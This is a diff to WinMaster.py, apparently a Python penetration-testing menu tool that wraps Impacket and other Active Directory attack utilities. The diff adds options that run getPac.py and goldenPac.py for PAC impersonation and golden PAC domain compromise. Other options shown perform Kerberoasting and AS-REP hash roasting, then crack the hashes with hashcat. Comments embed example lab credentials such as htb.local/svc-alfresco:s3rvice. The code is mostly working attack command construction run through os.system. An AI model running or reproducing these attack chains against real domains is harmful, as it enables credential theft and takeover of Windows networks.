@@ -40,8 +40,8 @@ if len(sys.argv) < 3:
     print "\nUse the command python WinMaster.py neo4j password\n"
     exit(True)
 
-BH1 = sys.argv[1]	# BLOODHOUND USERNAME
-BH2 = sys.argv[2]	# BLOODHOUND PASSWORD
+BH1 = sys.argv[1]	# NEO4J USERNAME
+BH2 = sys.argv[2]	# NEO4J PASSWORD
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -86,7 +86,7 @@ def gettime(value):
    return variable
 
 def command(command):
-#   print colored("Using Command: " + command + "\n", 'white')	# COMMENT OUT TO STOP DEBUGGING COMMANDS
+   print colored("Using Command: " + command + "\n", 'white')	# COMMENT OUT TO STOP DEBUGGING COMMANDS
    os.system(command)
    raw_input("\nPress ENTER to continue...")
    return
@@ -259,14 +259,14 @@ def display():
 
 # ----------------------------------------------------------------------------------------------------------------------------------------------------
 
-   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) GetArch  (30) Enum4Linux     (40) Create TGT      (50) Domain Dump  (60) FTP    " + u'\u2551'
+   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) GetArch  (30) Enum4Linux     (40) TGT Creation    (50) Domain Dump  (60) FTP    " + u'\u2551'
    print u'\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) NetView  (31) WinDapSearch   (41) TGT IMPERSONATE (51) BLOODHOUND   (61) SSH    " + u'\u2551'
-   print u'\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) Services (32) LookupSid      (42) GetUsersPns     (52) ACLPWN       (62) TelNet " + u'\u2551'
-   print u'\u2551' + "(3) Re/Set USERNAME    (13) Check Connection   (23) AtExec   (33) SamDump Users  (43) GetAdusers      (53) SecretsDump  (63) NetCat " + u'\u2551'
-   print u'\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) RpcDump        (44) KerbChecKUsers  (54) CrackMapExec (64) WinRem " + u'\u2551'
-   print u'\u2551' + "(5) Re/Set FOREST NAME (15) Check DNS SERVER   (25) PsExec   (35) REGistery      (45) GetNPUsers      (55) WmiExec HASH (65)        " + u'\u2551'
-   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) SmbExec  (36) SmbClient      (46)                 (56)              (66)        " + u'\u2551'
-   print u'\u2551' + "(7) Re/Set WORK GROUP  (17) Nmap Subdomains    (27) WmiExec  (37) SmbMap SHARE   (47)                 (57)              (67)        " + u'\u2551'
+   print u'\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) Services (32) LookupSid      (42) PAC IMPERSONATE (52) ACLPWN       (62) TelNet " + u'\u2551'
+   print u'\u2551' + "(3) Re/Set USERNAME    (13) Check Connection   (23) AtExec   (33) SamDump Users  (43) GOLDEN PAC      (53) SecretsDump  (63) NetCat " + u'\u2551'
+   print u'\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) RpcDump        (44) GetUsersPns     (54) CrackMapExec (64) WinRem " + u'\u2551'
+   print u'\u2551' + "(5) Re/Set FOREST NAME (15) Check DNS SERVER   (25) PsExec   (35) REGistery      (45) GetADUsers      (55) WmiExec HASH (65)        " + u'\u2551'
+   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) SmbExec  (36) SmbClient      (46) KerbCheckUsers  (56)              (66)        " + u'\u2551'
+   print u'\u2551' + "(7) Re/Set WORK GROUP  (17) Nmap Subdomains    (27) WmiExec  (37) SmbMap SHARE   (47) GetNPUsers      (57)              (67)        " + u'\u2551'
    print u'\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) IfMap    (38) SmbMount SHARE (48)                 (58)              (68)        " + u'\u2551'
    print u'\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) OpDump   (39) Rpc Client     (49)                 (59)              (69)        " + u'\u2551'
    print u'\u255A' + (u'\u2550')*132 + u'\u255D'
@@ -1137,11 +1137,33 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - GetUserSPNs.py -request -target-domain megabank.local megabank.local/ryan:Serv3r4Admin4cc123!
+# Details : Menu option selected - getPac.py -targetUser Administrator htb.local/svc-alfresco:s3rvice
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '42':
+      command(PRO + "getPac.py -targetUser " + POR.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : 1.0
+# Details : Menu option selected - goldenPac.py -dc-ip 10.10.10.161 -target-ip 10.10.10.161 htb.local/svc-alfresco:s3rvice@htb.local
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '43':
+      command(PRO + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + HST.rstrip(" "))
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : 1.0
+# Details : Menu option selected - GetUserSPNs.py -request -target-domain megabank.local megabank.local/ryan:Serv3r4Admin4cc123!
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '44':
       command(PRO + "GetUserSPNs.py -request -target-domain " + HST.rstrip(" ") +  " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ")) 
 
 # ------------------------------------------------------------------------------------- 
@@ -1152,7 +1174,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '43':
+   if selection == '45':
       command(PRO + "GetADUsers.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
@@ -1163,7 +1185,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '44':
+   if selection == '46':
       print "\nPlease wait..."
       os.system("nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=users.txt " + TIP.rstrip(" ") + " >> KUSERS.tmp")
       os.system("sed -i '/@/!d' KUSERS.tmp")
@@ -1202,7 +1224,7 @@ while True:
 # Modified: N/A                    megabank/-no-pass -usersfile users.txt
 # -------------------------------------------------------------------------------------
 
-   if selection =='45':
+   if selection =='47':
       if linecache.getline('users.txt', 1) != "":
          command(PRO + "GetNPUsers.py -outputfile hashroast.txt -format hashcat " + HST.rstrip(" ") + "/ -usersfile users.txt")
          command("hashcat -m 18200 --force -a 0 hashroast.txt /usr/share/wordlists/rockyou.txt -o cracked.txt")
@@ -1218,7 +1240,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='46':
+   if selection =='48':
       exit(1)
 
 # ------------------------------------------------------------------------------------- 
@@ -1229,36 +1251,14 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='47':
+   if selection =='49':
       exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '48':
-      exit(1)
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '49':
-      exit(1)
-
-# -------------------------------------------------------------------------------------
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
-# Details : Menu option selected - ldapdomaindump -u domain\user - PAS IP -o \DIR
+# Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
